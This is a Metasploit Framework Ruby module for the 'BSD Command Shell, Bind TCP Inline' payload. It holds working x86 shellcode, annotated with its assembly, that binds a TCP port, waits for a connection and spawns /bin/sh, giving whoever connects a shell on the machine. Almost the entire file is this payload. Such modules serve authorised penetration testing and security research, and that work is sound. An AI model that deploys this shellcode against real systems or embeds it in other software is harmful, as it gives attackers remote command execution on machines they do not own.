##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'


module Metasploit3

	include Msf::Payload::Single
	include Msf::Payload::Bsd

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'BSD Command Shell, Bind TCP Inline',
			'Version'       => '$Revision$',
			'Description'   => 'Listen for a connection and spawn a command shell',
			'Author'        => 'Ramon de Carvalho Valle <ramon[at]risesecurity.org>',
			'License'       => MSF_LICENSE,
			'Platform'      => 'bsd',
			'Arch'          => ARCH_X86,
			'Handler'       => Msf::Handler::BindTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'Payload'       =>
				{
					'Offsets' =>
						{
							'LPORT'    => [ 6, 'n' ],
						},
					'Payload' =>
						"\x31\xc0"             +#   xorl    %eax,%eax                  #
						"\x50"                 +#   pushl   %eax                       #
						"\x68\xff\x02\x04\xd2" +#   pushl   $0xd20402ff                #
						"\x89\xe7"             +#   movl    %esp,%edi                  #
						"\x50"                 +#   pushl   %eax                       #
						"\x6a\x01"             +#   pushl   $0x01                      #
						"\x6a\x02"             +#   pushl   $0x02                      #
						"\x6a\x10"             +#   pushl   $0x10                      #
						"\xb0\x61"             +#   movb    $0x61,%al                  #
						"\xcd\x80"             +#   int     $0x80                      #
						"\x57"                 +#   pushl   %edi                       #
						"\x50"                 +#   pushl   %eax                       #
						"\x50"                 +#   pushl   %eax                       #
						"\x6a\x68"             +#   pushl   $0x68                      #
						"\x58"                 +#   popl    %eax                       #
						"\xcd\x80"             +#   int     $0x80                      #
						"\x89\x47\xec"         +#   movl    %eax,-0x14(%edi)           #
						"\xb0\x6a"             +#   movb    $0x6a,%al                  #
						"\xcd\x80"             +#   int     $0x80                      #
						"\xb0\x1e"             +#   movb    $0x1e,%al                  #
						"\xcd\x80"             +#   int     $0x80                      #
						"\x50"                 +#   pushl   %eax                       #
						"\x50"                 +#   pushl   %eax                       #
						"\x6a\x5a"             +#   pushl   $0x5a                      #
						"\x58"                 +#   popl    %eax                       #
						"\xcd\x80"             +#   int     $0x80                      #
						"\xff\x4f\xe4"         +#   decl    -0x1c(%edi)                #
						"\x79\xf6"             +#   jns     <bndsockcode+42>           #
						"\x50"                 +#   pushl   %eax                       #
						"\x68\x2f\x2f\x73\x68" +#   pushl   $0x68732f2f                #
						"\x68\x2f\x62\x69\x6e" +#   pushl   $0x6e69622f                #
						"\x89\xe3"             +#   movl    %esp,%ebx                  #
						"\x50"                 +#   pushl   %eax                       #
						"\x54"                 +#   pushl   %esp                       #
						"\x53"                 +#   pushl   %ebx                       #
						"\x50"                 +#   pushl   %eax                       #
						"\xb0\x3b"             +#   movb    $0x3b,%al                  #
						"\xcd\x80"              #   int     $0x80                      #
				}
			))
	end

end